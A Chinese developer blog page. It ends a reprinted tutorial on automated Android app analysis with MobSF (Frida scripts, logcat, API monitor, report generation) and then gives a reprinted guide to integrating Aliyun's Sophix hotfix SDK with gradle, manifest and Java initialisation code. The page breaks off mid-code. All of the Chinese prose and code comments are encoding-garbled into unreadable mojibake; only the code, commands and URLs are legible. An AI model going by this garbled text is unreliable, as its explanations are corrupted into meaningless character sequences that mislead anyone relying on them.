<p>åŒæ ·ï¼Œå¦‚æœä¸å¿…ä½¿ç”¨é¢„å…ˆé…ç½®çš„Fridaè„šæœ¬ï¼Œä¹Ÿå¯ä»¥å°†Fridaè„šæœ¬ç²˜è´´åˆ°å³ä¾§çš„æ–‡æœ¬æ¡†ä¸­ã€‚è¿˜æœ‰ä¸€ä¸ªä¸‹æ‹‰æ¡†å¯ä»¥åŠ è½½è¿™äº›è„šæœ¬ã€‚æ‚¨ä¹Ÿå¯ä»¥ç¼–è¾‘ç›¸åŒçš„å†…å®¹ã€‚</p>
<p><img src="/2024/01/19/MobSF/26.png" alt="image"></p>
</blockquote>
<h3><span id="logcatæµ">Logcatæµ</span></h3><blockquote>
<p>Logcatä¹Ÿå¯ä»¥åœ¨MobSFçš„æœ¬åœ°ç¯å¢ƒä¸­æŸ¥çœ‹ã€‚é¡¶éƒ¨èœå•ä¸Šæœ‰ä¸€ä¸ªæŒ‰é’®ï¼Œå¯è®©ç”¨æˆ·æŸ¥çœ‹æ­¤å†…å®¹ã€‚</p>
<p><img src="/2024/01/19/MobSF/27.png" alt="image"></p>
</blockquote>
<h3><span id="apiç›‘æ§å™¨">APIç›‘æ§å™¨</span></h3><blockquote>
<p>å°±åƒlogcatç›‘è§†è®¾å¤‡æ—¥å¿—ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥ç›‘è§†APIã€‚APKå®æ—¶ä½¿ç”¨å„ç§APIæ¥æ‰§è¡Œå„ç§åŠŸèƒ½ï¼Œä¾‹å¦‚Base64åº“ã€‚</p>
<p><img src="/2024/01/19/MobSF/28.png" alt="image"></p>
<p>å› æ­¤ï¼Œå¦‚æœå‡½æ•°æ­£åœ¨ä½¿ç”¨æ­¤APIå¹¶è§£å¯†ä¸€ä¸ªå€¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ­¤å¤„çœ‹åˆ°è¯¥å€¼å¹¶å¯¹å…¶è¿›è¡Œè§£ç ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸‹é¢æ‚¨å¯ä»¥åœ¨Base64ä¸­çœ‹åˆ°ä¸€æ¬¡æ­¤ç±»å‡½æ•°çš„è¿”å›å€¼ã€‚</p>
<p><img src="/2024/01/19/MobSF/29.png" alt="image"></p>
</blockquote>
<h3><span id="ä¸‹è½½æŠ¥å‘Š">ä¸‹è½½æŠ¥å‘Š</span></h3><blockquote>
<p>å®Œæˆåˆ†æåï¼Œå¯ä»¥é€šè¿‡æ»‘åŠ¨å·¦ä¾§çš„èœå•æ æ»‘å—å¹¶å•å‡»ç”ŸæˆæŠ¥å‘Šæ¥ä¸‹è½½æŠ¥å‘Šã€‚</p>
<p><img src="/2024/01/19/MobSF/30.png" alt="image"></p>
<p>ç”ŸæˆæŠ¥å‘Šæ—¶ï¼Œæ‚¨å¯èƒ½ä¼šæ³¨æ„åˆ°ä¸€äº›é”™è¯¯ã€‚è¦è§£å†³æ­¤é—®é¢˜ï¼Œæ‚¨å¯ä»¥æŒ‰ç…§ä»¥ä¸‹å‘½ä»¤å®‰è£…<strong>wkhtmltopdf</strong>æ¨¡å—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install wkhtmltopdf</span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/MobSF/31.png" alt="image"></p>
<p>ç°åœ¨ï¼Œå†æ¬¡å•å‡»æœ€è¿‘çš„æ‰«ææ ï¼Œæ‚¨å°†çœ‹åˆ°é™æ€å’ŒåŠ¨æ€æŠ¥å‘Šç”Ÿæˆé€‰é¡¹ã€‚</p>
<p><img src="/2024/01/19/MobSF/32.png" alt="image"></p>
<p>è¯¥æŠ¥å‘Šå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="/2024/01/19/MobSF/33.png" alt="image"></p>
</blockquote>
<h2><span id="ç»“è®º">ç»“è®º</span></h2><p>MobSFæ˜¯åœ¨Android APKä¸Šè¿›è¡Œè‡ªåŠ¨åŒ–åˆ†æçš„ç»ä½³å·¥å…·ã€‚å®ƒå¹¶æ²¡æœ‰æ¶µç›–å¯¹æ‰€æœ‰æ¼æ´çš„åˆ†æï¼Œè®¸å¤šæµ‹è¯•åªèƒ½æ‰‹åŠ¨è¿›è¡Œï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªéå¸¸æ¼‚äº®çš„å°å·¥å…·ï¼Œå¯ä»¥åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå¸®åŠ©åˆ†æå¸ˆã€‚</p>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/android-pentest-automated-analysis-using-mobsf/">from</a></p>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/MobSF/" rel="tag">MobSF</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/15/Aliyun-Sophix/">
                é˜¿é‡Œçƒ­ä¿®å¤Sophixçš„ä½¿ç”¨æŒ‡å—
            </a>
        </h2>
    
    <time>
        Jan 15, 2024
    </time>
    <section class="content">
        <h1><span id="é˜¿é‡Œçƒ­ä¿®å¤sophixçš„ä½¿ç”¨æŒ‡å—">é˜¿é‡Œçƒ­ä¿®å¤Sophixçš„ä½¿ç”¨æŒ‡å—</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://juejin.cn/post/7250377976134533177">äº”é—®</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h2><span id="ä¸€-é˜¿é‡Œäº‘çƒ­ä¿®å¤sophixçš„ä»‹ç»">ä¸€ã€é˜¿é‡Œäº‘çƒ­ä¿®å¤Sophixçš„ä»‹ç»</span></h2><h3><span id="11-é¦–å…ˆçœ‹ä¸€ä¸‹å¸‚åœºä¸Šçƒ­ä¿®å¤æ–¹æ¡ˆçš„æ¯”è¾ƒ">1.1ã€é¦–å…ˆçœ‹ä¸€ä¸‹å¸‚åœºä¸Šçƒ­ä¿®å¤æ–¹æ¡ˆçš„æ¯”è¾ƒï¼š</span></h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434850.html">https://help.aliyun.com/document_detail/434850.html</a></p>
<p><img src="/2024/01/15/Aliyun-Sophix/1.png" alt="image"></p>
</blockquote>
<h3><span id="12-æ”¶è´¹æƒ…å†µ">1.2ã€æ”¶è´¹æƒ…å†µï¼š</span></h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434858.html">https://help.aliyun.com/document_detail/434858.html</a></p>
<p><img src="/2024/01/15/Aliyun-Sophix/2.png" alt="image"></p>
</blockquote>
<h2><span id="äºŒ-æ¥å…¥æŒ‡å—">äºŒã€æ¥å…¥æŒ‡å—</span></h2><h3><span id="21-å‡†å¤‡">2.1ã€å‡†å¤‡</span></h3><blockquote>
<ol>
<li>å‡†å¤‡å¥½é˜¿é‡Œäº‘è´¦å·</li>
<li>è¿›è¡Œèº«ä»½å®åè®¤è¯</li>
<li><a href="https://link.juejin.cn/?target=https://help.aliyun.com/product/434086.html">ç§»åŠ¨ç ”å‘å¹³å°EMAS</a>ï¼Œè¿›è¡Œé¡¹ç›®åˆ›å»º,åˆ›å»ºåä¼šç”Ÿæˆä¸€ä¸ª<code>aliyun-emas-services.json æ–‡ä»¶</code>ï¼Œé‡Œé¢åŒ…å«äº†çƒ­ä¿®å¤sdkæ¥å…¥æ—¶æ‰€éœ€çš„å¯†é’¥ï¼Œå¾ˆé‡è¦</li>
</ol>
</blockquote>
<h3><span id="22-emaså¹³å°çš„æ·»åŠ æµç¨‹å¦‚ä¸‹">2.2ã€EMASå¹³å°çš„æ·»åŠ æµç¨‹å¦‚ä¸‹ï¼š</span></h3><h4><span id="221-æ·»åŠ åº”ç”¨">2.2.1ã€æ·»åŠ åº”ç”¨</span></h4><blockquote>
<p><img src="/2024/01/15/Aliyun-Sophix/3.png" alt="image"></p>
<p><img src="/2024/01/15/Aliyun-Sophix/4.png" alt="image"></p>
<p>ç”Ÿæˆåº”ç”¨çš„keyä¿¡æ¯æ–‡ä»¶ï¼Œå¦‚æœå»ºè®®æŒ‰éœ€æ¥å…¥æ‰€éœ€åŠŸèƒ½ï¼Œæ²¡å¿…è¦ä¹Ÿä¸å®‰å…¨ï¼ŒæŒ‰ä¸‹å›¾å°†æ–‡ä»¶æ”¾å…¥åˆ°appä¸­</p>
<p><img src="/2024/01/15/Aliyun-Sophix/5.png" alt="image"></p>
<p>ä¸‹å›¾çš„çº¢æ¡†ä¸­çš„æ·»åŠ sdkä¹Ÿæ˜¯ï¼Œæ·»åŠ emaså¹³å°ä¸­çš„æ‰€æœ‰åŠŸèƒ½ï¼Œå»ºè®®æŒ‰éœ€æ¥å…¥æŸä¸ªåŠŸèƒ½ï¼ˆå¦‚ï¼šçƒ­ä¿®ï¼‰ï¼Œå¦å¤–è¯¥æ’ä»¶åœ¨Android <code>gradle 7</code>ä¹‹ä¸Šä¼šæŠ¥é”™</p>
<p><img src="/2024/01/15/Aliyun-Sophix/6.png" alt="image"></p>
</blockquote>
<h3><span id="23-çƒ­ä¿®å¤æ¥å…¥">2.3ã€çƒ­ä¿®å¤æ¥å…¥</span></h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434883.html">https://help.aliyun.com/document_detail/434883.html</a></p>
<p><strong>æ³¨æ„ç‚¹å¦‚ä¸‹ï¼š</strong></p>
<p>ä½¿ç”¨<code>gradle pluginç‰ˆæœ¬é«˜äº4.2æ—¶</code>ï¼Œå¯èƒ½ä¼šè‡ªåŠ¨å¼€å¯èµ„æºä¼˜åŒ–ã€‚å¼€å¯èµ„æºä¼˜åŒ–åï¼Œèµ„æºåç§°è¢«æ··æ·†ï¼Œä¼šå¯¼è‡´è¡¥ä¸å·¥å…·åœ¨ç”Ÿæˆè¡¥ä¸æ—¶ä¸€ç›´å¡åœ¨â€å¼€å§‹æ„å»ºè¡¥ä¸â€¦..â€ï¼Œæ— æ³•æ­£å¸¸è§£æapkåŒ…ã€‚<code>è§£å†³æ–¹æ¡ˆï¼šåœ¨gradle.properties ä¸­æ–°å¢android.enableResourceOptimizations=falseï¼Œ</code>é‡æ–°ç”ŸæˆåŸºçº¿åŒ…å’Œä¿®å¤åŒ…ï¼Œç„¶åå†ç”Ÿæˆè¡¥ä¸ã€‚</p>
<p>å¯†é’¥çš„ä½¿ç”¨æ¨èåœ¨<code>SophixStubApplication ä¸­åˆå§‹åŒ–</code>ï¼Œè€Œ<code>ä¸æ˜¯åœ¨AndroidManifestæ–‡ä»¶ä¸­é…ç½®</code></p>
<p>ä½¿ç”¨android studioæ‰“åŒ…ç”Ÿæˆapkæ—¶ï¼Œè¦å…³é—­instant runã€‚</p>
<p><a href="https://link.juejin.cn/?target=https://help.aliyun.com/document_detail/434885.htm%23h3-h2c-ysc-sto">queryAndLoadNewPatchæ–¹æ³•</a>ç”¨æ¥è¯·æ±‚æ§åˆ¶å°å‘å¸ƒçš„è¡¥ä¸åŒ…ï¼Œä¼šæ¶‰åŠè®¾å¤‡ä¿¡æ¯è¯»å–ï¼Œæ‰€ä»¥å¿…é¡»åœ¨ç”¨æˆ·åŒæ„éšç§åè®®ä¹‹åè°ƒç”¨ã€‚å¦å¤–ç”¨æˆ·å¯æ ¹æ®ä¸šåŠ¡æƒ…å†µï¼Œé…Œæƒ…è€ƒè™‘æ˜¯å¦æ‰“å¼€æ­¤å¼€å…³ã€‚</p>
<p>ä½†ä¸å¯æ”¾åœ¨attachBaseContextä¸­ï¼Œå¦åˆ™æ— ç½‘ç»œæƒé™ï¼Œå»ºè®®æ”¾åœ¨ä¸»è¿›ç¨‹ç”¨æˆ·åŒæ„éšç§åè®®ä¹‹åçš„ä»»æ„æ—¶åˆ»ã€‚</p>
<p>æ¥å…¥æµç¨‹æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<p><strong>æ·»åŠ å·¥ç¨‹ä¾èµ–</strong></p>
<h4><span id="1-android-studioé›†æˆæ–¹å¼">1. Android Studioé›†æˆæ–¹å¼</span></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gradleè¿œç¨‹ä»“åº“ä¾èµ–, æ‰“å¼€é¡¹ç›®æ‰¾åˆ°Appçš„build.gradleæ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®ï¼š</span><br><span class="line"></span><br><span class="line">æ·»åŠ Mavenä»“åº“åœ°å€ï¼š</span><br><span class="line"></span><br><span class="line">****</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br><span class="line"><span class="string">repositories &#123;</span></span><br><span class="line"><span class="string">   maven &#123;</span></span><br><span class="line"><span class="string">       url &quot;http://maven.aliyun.com/nexus/content/repositories/releases&quot;</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span></span><br></pre></td></tr></table></figure>

<h4><span id="2æ·»åŠ gradleåæ ‡ç‰ˆæœ¬ä¾èµ–">2.æ·»åŠ gradleåæ ‡ç‰ˆæœ¬ä¾èµ–ï¼š</span></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    ......</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">&quot;com.xxx.xxx&quot;</span> <span class="comment">//åŒ…å</span></span><br><span class="line">        ......</span><br><span class="line">        ndk &#123;</span><br><span class="line">            <span class="comment">//é€‰æ‹©è¦æ·»åŠ çš„å¯¹åº”cpuç±»å‹çš„.soåº“ã€‚</span></span><br><span class="line">            <span class="comment">//çƒ­ä¿®å¤æ”¯æŒäº”ç§</span></span><br><span class="line">            abiFilters <span class="string">&#x27;arm64-v8a&#x27;</span>, <span class="string">&#x27;armeabi&#x27;</span>, <span class="string">&#x27;armeabi-v7a&#x27;</span>, <span class="string">&#x27;x86&#x27;</span>, <span class="string">&#x27;x86_64&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">dependencies &#123;</span><br><span class="line">    ......</span><br><span class="line">        compile <span class="string">&#x27;com.aliyun.ams:alicloud-android-hotfix:3.3.5&#x27;</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="3æ·»åŠ åº”ç”¨æƒé™">3.æ·»åŠ åº”ç”¨æƒé™</span></h4><p>Sophix SDKä½¿ç”¨åˆ°ä»¥ä¸‹æƒé™ï¼Œä½¿ç”¨Mavenä¾èµ–æˆ–è€…aarä¾èµ–å¯ä»¥ä¸ç”¨é…ç½®ã€‚å…·ä½“é…ç½®åœ¨AndroidManifest.xmlä¸­ã€‚</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<h4><span id="4é…ç½®androidmanifestæ–‡ä»¶">4.é…ç½®AndroidManifestæ–‡ä»¶</span></h4><p><code>ä¹Ÿå¯ä»¥ä¸ç”¨é…ç½®(ç›´æ¥åœ¨SophixStubApplicationï¼Œæ–‡ä»¶ä¸­åˆå§‹åŒ–é…ç½®å³å¯ï¼ˆæ¨èåœ¨SophixStubApplicationä¸­é…ç½®ï¼‰)</code>ï¼Œåœ¨ <a href="https://link.juejin.cn/?target=https://help.aliyun.com/product/434086.html">ç§»åŠ¨ç ”å‘å¹³å°EMAS</a>ï¼Œè¿›è¡Œé¡¹ç›®åˆ›å»º,åˆ›å»ºåä¼šç”Ÿæˆä¸€ä¸ª<code>aliyun-emas-services.json æ–‡ä»¶</code>ï¼Œé‡Œé¢åŒ…å«äº†çƒ­ä¿®å¤sdkæ¥å…¥æ—¶æ‰€éœ€çš„å¯†é’¥</p>
<p>åœ¨<code>AndroidManifest.xml</code>ä¸­é—´çš„<code>application</code>èŠ‚ç‚¹ä¸‹æ·»åŠ å¦‚ä¸‹é…ç½®ï¼š</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line">android:<span class="attr">name</span>=<span class="string">&quot;com.taobao.android.hotfix.IDSECRET&quot;</span></span><br><span class="line">android:<span class="attr">value</span>=<span class="string">&quot;App ID&quot;</span> /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">android:<span class="attr">name</span>=<span class="string">&quot;com.taobao.android.hotfix.APPSECRET&quot;</span></span><br><span class="line">android:<span class="attr">value</span>=<span class="string">&quot;App Secret&quot;</span> /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">android:<span class="attr">name</span>=<span class="string">&quot;com.taobao.android.hotfix.RSASECRET&quot;</span></span><br><span class="line">android:<span class="attr">value</span>=<span class="string">&quot;RSAå¯†é’¥&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>

<h4><span id="5-æ··æ·†é…ç½®æŒ‰éœ€é…ç½®">5. æ··æ·†é…ç½®,æŒ‰éœ€é…ç½®</span></h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"><span class="meta">#åŸºçº¿åŒ…ä½¿ç”¨ï¼Œç”Ÿæˆmapping.txt</span></span><br><span class="line">-printmapping mapping.txt</span><br><span class="line"><span class="meta">#ç”Ÿæˆçš„mapping.txtåœ¨app/build/outputs/mapping/releaseè·¯å¾„ä¸‹ï¼Œç§»åŠ¨åˆ°/appè·¯å¾„ä¸‹</span></span><br><span class="line"><span class="meta">#ä¿®å¤åçš„é¡¹ç›®ä½¿ç”¨ï¼Œä¿è¯æ··æ·†ç»“æœä¸€è‡´</span></span><br><span class="line"><span class="meta">#-applymapping mapping.txt</span></span><br><span class="line"><span class="meta">#hotfix</span></span><br><span class="line">-keep <span class="keyword">class</span> <span class="title">com.taobao.sophix</span>.**&#123;*;&#125;</span><br><span class="line">-keep <span class="keyword">class</span> <span class="title">com.ta.utdid2.device</span>.**&#123;*;&#125;</span><br><span class="line"><span class="meta">#é˜²æ­¢inline</span></span><br><span class="line">-dontoptimize</span><br><span class="line">```</span><br><span class="line">**</span><br><span class="line">**é‡è¦**</span><br><span class="line"></span><br><span class="line">å¼€å¯æ··æ·†æ—¶ï¼Œç”Ÿæˆä¿®å¤åŒ…è¦ä½¿ç”¨æ—§åŒ…çš„mappingæ–‡ä»¶ä»¥ä¿è¯æ··æ·†ç»“æœä¸€è‡´ã€‚</span><br><span class="line">åˆå§‹åŒ–</span><br></pre></td></tr></table></figure>

<h4><span id="6-åˆå§‹åŒ–">6. åˆå§‹åŒ–</span></h4><p>åˆå§‹åŒ–çš„è°ƒç”¨åº”è¯¥å°½å¯èƒ½çš„æ—©ï¼Œå¿…é¡»åœ¨<code>Application.attachBaseContext()</code>çš„æœ€å¼€å§‹ï¼ˆåœ¨super.attachBaseContextä¹‹åï¼Œå¦‚æœæœ‰Multidexï¼Œä¹Ÿéœ€è¦åœ¨Multidex.installä¹‹åï¼‰è¿›è¡ŒSDKåˆå§‹åŒ–æ“ä½œï¼Œåˆå§‹åŒ–ä¹‹å‰ä¸èƒ½ç”¨åˆ°å…¶ä»–è‡ªå®šä¹‰ç±»ï¼Œå¦åˆ™ææœ‰å¯èƒ½å¯¼è‡´å´©æºƒã€‚è€ŒæŸ¥è¯¢æœåŠ¡å™¨æ˜¯å¦æœ‰å¯ç”¨è¡¥ä¸çš„æ“ä½œå¯ä»¥åœ¨åé¢çš„ä»»æ„åœ°æ–¹ã€‚ä¸å»ºè®®åœ¨<code>Application.onCreate()</code>ä¸­åˆå§‹åŒ–ï¼Œå› ä¸ºå¦‚æœå¸¦æœ‰ContentProviderï¼Œå°±ä¼šä½¿å¾—Sophixåˆå§‹åŒ–æ—¶æœºå¤ªè¿Ÿä»è€Œå¼•å‘é—®é¢˜ã€‚</p>
<p>Sophixæœ€æ–°ç‰ˆæœ¬å¼•å…¥äº†æ–°çš„åˆå§‹åŒ–æ–¹å¼ã€‚</p>
<p>åŸæ¥çš„åˆå§‹åŒ–æ–¹å¼ä»ç„¶å¯ä»¥ä½¿ç”¨ã€‚åªæ˜¯æ–°æ–¹å¼å¯ä»¥æä¾›æ›´å…¨é¢çš„åŠŸèƒ½ä¿®å¤æ”¯æŒï¼Œå°†ä¼šå¸¦æ¥ä»¥ä¸‹ä¼˜ç‚¹ï¼š</p>
<ul>
<li>åˆå§‹åŒ–ä¸åº”ç”¨åŸå…ˆä¸šåŠ¡ä»£ç å®Œå…¨éš”ç¦»ï¼Œä½¿å¾—åŸå…ˆçœŸæ­£çš„Applicationå¯ä»¥ä¿®å¤ï¼Œå¹¶ä¸”å‡å°‘äº†è¡¥ä¸é¢„åŠ è½½æ—¶é—´ç­‰ç­‰ã€‚</li>
<li>æ–°æ–¹å¼èƒ½å¤Ÿæ›´å®Œç¾åœ°å…¼å®¹Android 8.0ä»¥åç‰ˆæœ¬ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SophixStubApplication</span> <span class="keyword">extends</span> <span class="title class_">SophixApplication</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;SophixStubApplication&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">appVersion</span> <span class="operator">=</span> <span class="string">&quot;0.0.0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ­¤å¤„SophixEntryåº”æŒ‡å®šçœŸæ­£çš„Applicationï¼Œå¹¶ä¸”ä¿è¯RealApplicationStubç±»åä¸è¢«æ··æ·†ã€‚</span></span><br><span class="line">    <span class="meta">@SophixEntry(MyApplication.class)</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">RealApplicationStub</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">attachBaseContext</span><span class="params">(Context base)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.attachBaseContext(base);</span><br><span class="line">        initSophix();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initSophix</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            appVersion = <span class="built_in">this</span>.getPackageManager()</span><br><span class="line">                    .getPackageInfo(<span class="built_in">this</span>.getPackageName(), <span class="number">0</span>)</span><br><span class="line">                    .versionName;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">SophixManager</span> <span class="variable">instance</span> <span class="operator">=</span> SophixManager.getInstance();</span><br><span class="line">        List&lt;String&gt; tags = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">///todo æ„å»ºæ­£å¼åŒ…ä¹‹å‰éœ€è¦ä¿®æ”¹ä¸ºï¼š</span></span><br><span class="line">        <span class="comment">///tags.add(&quot;production&quot;);</span></span><br><span class="line">        tags.add(<span class="string">&quot;test&quot;</span>); <span class="comment">//è¿™ä¸ªå€¼å°±æ˜¯ï¼Œä½ è¿›è¡Œç°åº¦åŒ…çƒ­ä¿®æ—¶ï¼Œè¦å¡«å†™çš„tag</span></span><br><span class="line">        <span class="keyword">for</span> (String tag : tags) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;sophix tag:&quot;</span> + tag);</span><br><span class="line">        &#125;</span><br><span class="line">        instance.setContext(<span class="built_in">this</span>)</span><br><span class="line">                .setAppVersion(appVersion)</span><br><span class="line">                .setEnableDebug(<span class="literal">false</span>)</span><br><span class="line">                .setEnableFullLog()</span><br><span class="line">                .setTags(tags)</span><br><span class="line">                .setSecretMetaData(<span class="string">&quot;ä½ è‡ªå·±çš„hotfix.idSecret&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;ä½ è‡ªå·±çš„emas.appSecret&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;ä½ è‡ªå·±çš„hotfix.rsaSecret&quot;</span>)</span><br><span class="line">                .setPatchLoadStatusStub(<span class="keyword">new</span> <span class="title class_">PatchLoadStatusListener</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onLoad</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> mode, <span class="keyword">final</span> <span class="type">int</span> code, <span class="keyword">final</span> String info, <span class="keyword">final</span> <span class="type">int</span> handlePatchVersion)</span> &#123;</span><br><span class="line">                        Log.e(TAG, <span class="string">&quot;sophix handlePatchVersion:&quot;</span> + handlePatchVersion + <span class="string">&quot; /code:&quot;</span> + code + <span class="string">&quot; /info:&quot;</span> + info);</span><br><span class="line">                        <span class="keyword">if</span> (code == PatchStatus.CODE_LOAD_SUCCESS) &#123;</span><br><span class="line">                            <span class="comment">///é‡å¯åä¼šè£…è½½è¡¥ä¸ä¼šè°ƒç”¨è¯¥æ–¹æ³•</span></span><br><span class="line">                            Log.e(TAG, <span class="string">&quot;sophix load patch &quot;</span> + handlePatchVersion + <span class="string">&quot; success!&quot;</span> + info);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == PatchStatus.CODE_LOAD_RELAUNCH) &#123;</span><br><span class="line">                            <span class="comment">///è¡¥ä¸åŠ è½½æˆåŠŸä¼šè°ƒç”¨è¯¥æ–¹æ³•</span></span><br><span class="line">                            <span class="comment">// å¦‚æœéœ€è¦åœ¨åå°é‡å¯ï¼Œå»ºè®®æ­¤å¤„ç”¨SharePreferenceä¿å­˜çŠ¶æ€ã€‚</span></span><br><span class="line">                            Log.e(TAG, <span class="string">&quot;sophix preload patch success. restart app to make effect. handlePatchVersion:&quot;</span> + handlePatchVersion);</span><br><span class="line">                          </span><br><span class="line">                            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                            intent.putExtra(<span 